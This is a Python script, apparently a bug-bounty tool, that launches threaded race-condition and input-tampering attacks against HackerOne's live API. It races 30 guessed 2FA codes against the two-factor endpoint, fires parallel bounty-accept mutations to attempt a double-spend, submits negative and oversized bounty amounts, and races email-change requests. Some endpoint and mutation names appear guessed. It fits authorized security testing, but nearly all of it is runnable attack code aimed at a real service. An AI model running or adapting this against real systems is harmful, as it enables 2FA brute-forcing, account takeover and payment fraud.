#!/usr/bin/env python3
"""
HackerOne Race Condition Tester
Tests: bounty double-spend, 2FA rate limits, negative bounty amounts, report action races.
Uses threading for true parallel requests.

Usage:
  python3 h1_race.py --token-a TOKEN --test 2fa
  python3 h1_race.py --token-a TOKEN --token-b TOKEN_B --test bounty --report-id ID
  python3 h1_race.py --token-a TOKEN --test negative-bounty --report-id ID
"""

import argparse
import json
import threading
import time
from typing import Optional
import urllib.request
import urllib.error

BASE = "https://hackerone.com"
RESULTS = []
LOCK = threading.Lock()

def gql_raw(token: str, query: str) -> tuple[int, dict]:
    data = json.dumps({"query": query}).encode()
    req = urllib.request.Request(
        f"{BASE}/graphql",
        data=data,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, {"_error": e.read().decode(errors="replace")}
    except Exception as e:
        return 0, {"_error": str(e)}


def rest_raw(token: str, method: str, path: str, data: dict = None) -> tuple[int, str]:
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(
        f"{BASE}{path}",
        data=body,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
            "X-Auth-Token": token,
        },
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


# ─── Race: 2FA Rate Limiting ──────────────────────────────────────────────────

def test_2fa_rate_limit(token: str, count: int = 30):
    """Send N wrong 2FA codes rapidly — check if rate limiting kicks in."""
    print(f"\n[2FA Rate Limit] Sending {count} requests")
    print("  NOTE: Run this against YOUR Account B with 2FA enabled")
    print("  This tests rate limiting, not credential validity\n")

    responses = []
    barrier = threading.Barrier(count)

    def send_code(i: int):
        code = f"{i:06d}"
        barrier.wait()  # all threads release simultaneously
        status, body = rest_raw(token, "POST", "/users/two_factor_authentication",
                                 data={"user": {"otp_attempt": code}})
        with LOCK:
            responses.append((i, status, "429" in str(status) or "rate" in body.lower()))
            print(f"  [{i:02d}] code={code} HTTP={status}")

    threads = [threading.Thread(target=send_code, args=(i,)) for i in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    rate_limited = [r for r in responses if r[2]]
    print(f"\n  Results: {len(responses)} requests sent")
    print(f"  Rate limited: {len(rate_limited)}")
    if not rate_limited:
        print("  [POTENTIAL FINDING] No rate limiting on 2FA endpoint")
        print("  Severity: MEDIUM — brute force possible if no other control")
    else:
        print(f"  [OK] Rate limiting active at attempt ~{min(r[0] for r in rate_limited)}")


# ─── Race: Bounty Double-Spend ────────────────────────────────────────────────

def test_bounty_race(token_a: str, report_id: str, count: int = 20):
    """Send N parallel bounty accept/award requests — check if double-spend possible."""
    print(f"\n[Bounty Race Condition] {count} parallel requests on report {report_id}")
    print("  Requires: report with a pending bounty award")

    responses = []
    barrier = threading.Barrier(count)

    def accept_bounty(i: int):
        # Try accepting bounty via GraphQL mutation
        q = f'mutation {{ acceptBounty(input: {{ report_id: "{report_id}" }}) {{ report {{ bounty_amount }} }} }}'
        barrier.wait()
        status, resp = gql_raw(token_a, q)
        amount = resp.get("data", {}).get("acceptBounty", {})
        with LOCK:
            responses.append((i, status, amount))
            print(f"  [{i:02d}] HTTP={status} data={str(amount)[:60]}")

    threads = [threading.Thread(target=accept_bounty, args=(i,)) for i in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    successes = [r for r in responses if r[2]]
    print(f"\n  Successful responses: {len(successes)}")
    if len(successes) > 1:
        print("  [FINDING] Multiple bounty accepts succeeded! Potential double-spend")
    else:
        print("  [OK] Only one accept succeeded (or endpoint doesn't exist)")


# ─── Race: Negative Bounty ────────────────────────────────────────────────────

def test_negative_bounty(token: str, report_id: str):
    """Try awarding negative or zero bounty amounts."""
    print(f"\n[Negative Bounty Test] report_id={report_id}")

    amounts = [0, -1, -500, -9999999, 9999999, 0.01, -0.01]

    for amount in amounts:
        q = f'''mutation {{
          awardBounty(input: {{
            report_id: "{report_id}"
            amount: {amount}
            currency: "USD"
            message: "test"
          }}) {{
            bounty {{ amount }}
          }}
        }}'''
        status, resp = gql_raw(token, q)
        data = resp.get("data", {}).get("awardBounty")
        errors = resp.get("errors", [])
        err_msg = errors[0].get("message", "")[:80] if errors else "none"
        print(f"  amount={amount:>12} → HTTP {status} | data={data} | error={err_msg}")
        time.sleep(0.3)


# ─── Race: Email Change ───────────────────────────────────────────────────────

def test_email_change_race(token: str, email1: str, email2: str, count: int = 10):
    """Send simultaneous email change requests to two different addresses."""
    print(f"\n[Email Change Race] {count} parallel requests")
    print(f"  Email 1: {email1}")
    print(f"  Email 2: {email2}")

    responses = []
    barrier = threading.Barrier(count)

    def change_email(i: int):
        new_email = email1 if i % 2 == 0 else email2
        q = f'mutation {{ updateUser(input: {{ email: "{new_email}" }}) {{ user {{ email }} }} }}'
        barrier.wait()
        status, resp = gql_raw(token, q)
        result_email = resp.get("data", {}).get("updateUser", {}).get("user", {}).get("email")
        with LOCK:
            responses.append((i, new_email, status, result_email))
            print(f"  [{i:02d}] target={new_email} HTTP={status} result={result_email}")

    threads = [threading.Thread(target=change_email, args=(i,)) for i in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Check final state
    time.sleep(1)
    _, current = gql_raw(token, "{ me { email } }")
    final = current.get("data", {}).get("me", {}).get("email")
    print(f"\n  Final account email: {final}")

    unique_results = set(r[3] for r in responses if r[3])
    if len(unique_results) > 1:
        print(f"  [INTERESTING] Got {len(unique_results)} different email results during race")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="HackerOne Race Condition Tester")
    parser.add_argument("--token-a", required=True, help="Account A Bearer token")
    parser.add_argument("--token-b", help="Account B Bearer token (for some tests)")
    parser.add_argument("--test", required=True,
                        choices=["2fa", "bounty", "negative-bounty", "email-race", "all"],
                        help="Which test to run")
    parser.add_argument("--report-id", help="Report ID for bounty tests")
    parser.add_argument("--count", type=int, default=20, help="Number of parallel requests")
    parser.add_argument("--email1", help="First email for race test")
    parser.add_argument("--email2", help="Second email for race test")
    args = parser.parse_args()

    print("HackerOne Race Condition Tester")
    print(f"Test: {args.test} | Threads: {args.count}\n")

    if args.test in ("2fa", "all"):
        t = args.token_b or args.token_a
        test_2fa_rate_limit(t, args.count)

    if args.test in ("bounty", "all"):
        if not args.report_id:
            print("ERROR: --report-id required for bounty test")
        else:
            test_bounty_race(args.token_a, args.report_id, args.count)

    if args.test in ("negative-bounty", "all"):
        if not args.report_id:
            print("ERROR: --report-id required for negative-bounty test")
        else:
            test_negative_bounty(args.token_a, args.report_id)

    if args.test in ("email-race", "all"):
        if not args.email1 or not args.email2:
            print("ERROR: --email1 and --email2 required for email-race test")
        else:
            test_email_change_race(args.token_a, args.email1, args.email2, args.count)


if __name__ == "__main__":
    main()
